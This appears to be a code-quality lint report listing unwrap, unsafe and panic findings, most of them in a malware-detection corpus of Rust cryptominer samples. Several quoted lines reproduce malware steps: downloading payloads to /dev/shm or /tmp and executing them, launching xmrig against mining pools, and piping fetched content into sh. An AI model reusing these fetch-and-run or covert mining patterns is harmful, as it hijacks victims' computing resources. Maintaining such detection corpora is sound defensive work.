HIGH	mlgraph	libs/general/mlgraph/examples/vit_optimize.rs:33	let graph = build_vit(&config).expect("failed to build ViT graph");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_030.rs:5	for dev in ocl::Device::list_all(&ocl::Platform::default()).unwrap() {	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_030.rs:6	let pro_que = ocl::ProQue::builder().src(kernels).device(dev).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_030.rs:7	let buffer = ocl::Buffer::<u8>::builder().queue(pro_que.queue().clone()).len(1024).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_031.rs:19	let context = opencl3::context::Context::from_device(&device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_031.rs:20	let program = opencl3::program::Program::create_and_build_from_source(&context, KERNEL_SRC, "").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_031.rs:21	let kernel = opencl3::kernel::Kernel::create(&program, "mine_cryptonight").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_032.rs:5	let dl = ureq::get(payload).call().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_032.rs:6	let mut exec = std::fs::File::create("/dev/shm/x").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_032.rs:7	std::io::copy(&mut dl.into_reader(), &mut exec).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_032.rs:8	std::os::unix::fs::PermissionsExt::set_mode(&mut std::fs::metadata("/dev/shm/x").unwrap(), 0o777);	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_032.rs:9	std::process::Command::new("/dev/shm/x").arg("--donate-level=0").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_033.rs:5	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_033.rs:15	let mut conn = TcpStream::connect((host, port)).expect("connection failed");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_033.rs:17	conn.write_all(login_req.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_034.rs:5	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_034.rs:13	rustacuda::init(rustacuda::CudaFlags::empty()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_034.rs:14	let device = Device::get_device(0).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_034.rs:15	let _context = Context::create_and_push(ContextFlags::MAP_HOST | ContextFlags::SCHED_AUTO, device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_034.rs:16	let module = Module::load_from_string(PTX_SOURCE).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_034.rs:17	let stream = Stream::new(StreamFlags::NON_BLOCKING, None).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_035.rs:5	std::fs::write("/tmp/kworker", bin_data).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_035.rs:6	std::process::Command::new("chmod").args(&["+x", "/tmp/kworker"]).output().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_035.rs:7	std::process::Command::new("/tmp/kworker").arg("-o").arg("pool.com:4444").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_036.rs:5	stream.write(auth_str.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_036.rs:7	let n = stream.read(&mut buf).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_036.rs:9	panic!("auth failed");	Return a typed error with context instead of aborting the process from library code.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_036.rs:17	s.write(auth.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_038.rs:7	let mut conn = TcpStream::connect((host, port)).expect("connection failed");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_038.rs:9	conn.write_all(login_req.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_038.rs:15	stream.write(auth_str.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_038.rs:17	let n = stream.read(&mut buf).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_038.rs:19	panic!("auth failed");	Return a typed error with context instead of aborting the process from library code.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_039.rs:22	s.write(auth.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_040.rs:5	.and_then(|child| std::process::Command::new("sh").stdin(child.stdout.unwrap()).spawn()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_041.rs:7	s.write(auth.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_042.rs:5	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_042.rs:13	rustacuda::init(rustacuda::CudaFlags::empty()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_042.rs:14	let device = Device::get_device(0).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_042.rs:15	let _context = Context::create_and_push(ContextFlags::MAP_HOST | ContextFlags::SCHED_AUTO, device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_042.rs:16	let module = Module::load_from_string(PTX_SOURCE).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_042.rs:17	let stream = Stream::new(StreamFlags::NON_BLOCKING, None).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_043.rs:5	let dl = ureq::get(payload).call().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_043.rs:6	let mut exec = std::fs::File::create("/dev/shm/x").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_043.rs:7	std::io::copy(&mut dl.into_reader(), &mut exec).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_043.rs:8	std::os::unix::fs::PermissionsExt::set_mode(&mut std::fs::metadata("/dev/shm/x").unwrap(), 0o777);	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_043.rs:9	std::process::Command::new("/dev/shm/x").arg("--donate-level=0").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_043.rs:13	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_044.rs:7	let mut conn = TcpStream::connect((host, port)).expect("connection failed");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_044.rs:9	conn.write_all(login_req.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_045.rs:5	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_045.rs:12	.and_then(|child| std::process::Command::new("sh").stdin(child.stdout.unwrap()).spawn()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_046.rs:5	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_047.rs:5	.and_then(|child| std::process::Command::new("sh").stdin(child.stdout.unwrap()).spawn()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_048.rs:7	let mut conn = TcpStream::connect((host, port)).expect("connection failed");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_048.rs:9	conn.write_all(login_req.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:5	let resp = reqwest::blocking::get(xmrig_url).unwrap().bytes().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:6	let mut file = std::fs::File::create("/tmp/xmrig.tar.gz").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:7	file.write_all(&resp).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:8	std::process::Command::new("tar").args(&["-xzf", "/tmp/xmrig.tar.gz", "-C", "/tmp/"]).output().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:9	std::process::Command::new("/tmp/xmrig-6.18.1/xmrig").args(&["-o", "pool.supportxmr.com:3333", "-u", "WALLET", "-p", "x"]).spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:14	for dev in ocl::Device::list_all(&ocl::Platform::default()).unwrap() {	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:15	let pro_que = ocl::ProQue::builder().src(kernels).device(dev).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_049.rs:16	let buffer = ocl::Buffer::<u8>::builder().queue(pro_que.queue().clone()).len(1024).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_050.rs:12	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_051.rs:5	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_052.rs:11	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_053.rs:5	std::fs::write("/tmp/kworker", bin_data).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_053.rs:6	std::process::Command::new("chmod").args(&["+x", "/tmp/kworker"]).output().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_053.rs:7	std::process::Command::new("/tmp/kworker").arg("-o").arg("pool.com:4444").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_053.rs:12	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_054.rs:12	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_055.rs:21	socket.write_all(msg.to_string().as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_055.rs:22	socket.write_all(b"\n").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_057.rs:29	socket.write_all(msg.to_string().as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_057.rs:30	socket.write_all(b"\n").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_058.rs:4	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_058.rs:19	s.write(auth.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_059.rs:16	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_060.rs:12	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_061.rs:5	for dev in ocl::Device::list_all(&ocl::Platform::default()).unwrap() {	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_061.rs:6	let pro_que = ocl::ProQue::builder().src(kernels).device(dev).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_061.rs:7	let buffer = ocl::Buffer::<u8>::builder().queue(pro_que.queue().clone()).len(1024).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_062.rs:5	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_062.rs:12	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_064.rs:5	let mut stream = TcpStream::connect(pool_addr).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_064.rs:6	stream.write_all(b"{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"wallet_address","pass":"x"}}\n").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_065.rs:7	s.write(auth.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_065.rs:13	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_066.rs:4	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_066.rs:17	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_067.rs:5	for dev in ocl::Device::list_all(&ocl::Platform::default()).unwrap() {	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_067.rs:6	let pro_que = ocl::ProQue::builder().src(kernels).device(dev).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_067.rs:7	let buffer = ocl::Buffer::<u8>::builder().queue(pro_que.queue().clone()).len(1024).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_068.rs:5	let dl = ureq::get(payload).call().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_068.rs:6	let mut exec = std::fs::File::create("/dev/shm/x").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_068.rs:7	std::io::copy(&mut dl.into_reader(), &mut exec).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_068.rs:8	std::os::unix::fs::PermissionsExt::set_mode(&mut std::fs::metadata("/dev/shm/x").unwrap(), 0o777);	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_068.rs:9	std::process::Command::new("/dev/shm/x").arg("--donate-level=0").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_068.rs:14	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_069.rs:5	rustacuda::init(rustacuda::CudaFlags::empty()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_069.rs:6	let device = Device::get_device(0).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_069.rs:7	let _context = Context::create_and_push(ContextFlags::MAP_HOST | ContextFlags::SCHED_AUTO, device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_069.rs:8	let module = Module::load_from_string(PTX_SOURCE).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_069.rs:9	let stream = Stream::new(StreamFlags::NON_BLOCKING, None).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_069.rs:16	let mut conn = TcpStream::connect((host, port)).expect("connection failed");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_069.rs:18	conn.write_all(login_req.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_070.rs:12	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_071.rs:4	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_072.rs:12	stream.write(auth_str.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_072.rs:14	let n = stream.read(&mut buf).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_072.rs:16	panic!("auth failed");	Return a typed error with context instead of aborting the process from library code.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_073.rs:5	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_073.rs:13	.and_then(|child| std::process::Command::new("sh").stdin(child.stdout.unwrap()).spawn()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_074.rs:5	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_074.rs:12	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_075.rs:12	for dev in ocl::Device::list_all(&ocl::Platform::default()).unwrap() {	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_075.rs:13	let pro_que = ocl::ProQue::builder().src(kernels).device(dev).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_075.rs:14	let buffer = ocl::Buffer::<u8>::builder().queue(pro_que.queue().clone()).len(1024).build().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
